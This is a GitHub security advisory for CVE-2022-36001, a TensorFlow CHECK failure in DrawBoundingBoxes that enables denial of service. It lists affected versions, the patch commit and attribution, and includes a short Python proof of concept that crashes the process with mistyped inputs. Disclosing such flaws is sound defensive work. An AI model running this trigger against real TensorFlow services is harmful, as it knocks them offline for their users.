# [M] TensorFlow vulnerable to `CHECK` fail in `DrawBoundingBoxes`

## Summary
Severity: Medium
Advisory: GHSA-jqm7-m5q7-3hm5
CVE: CVE-2022-36001
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-jqm7-m5q7-3hm5
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
When `DrawBoundingBoxes` receives an input `boxes` that is not of dtype `float`, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np
arg_0=tf.constant(value=np.random.random(size=(1, 3, 2, 3)), shape=(1, 3, 2, 3), dtype=tf.half)
arg_1=tf.constant(value=np.random.random(size=(1, 2, 4)), shape=(1, 2, 4), dtype=tf.float32)
arg_2=''
tf.raw_ops.DrawBoundingBoxes(images=arg_0, boxes=arg_1, name=arg_2)
```

### Patches
We have patched the issue in GitHub commit [da0d65cdc1270038e72157ba35bf74b85d9bda11](https://github.com/tensorflow/tensorflow/commit/da0d65cdc1270038e72157ba35bf74b85d9bda11).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jqm7-m5q7-3hm5
- https://nvd.nist.gov/vuln/detail/CVE-2022-36001
- https://github.com/tensorflow/tensorflow/commit/da0d65cdc1270038e72157ba35bf74b85d9bda11
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
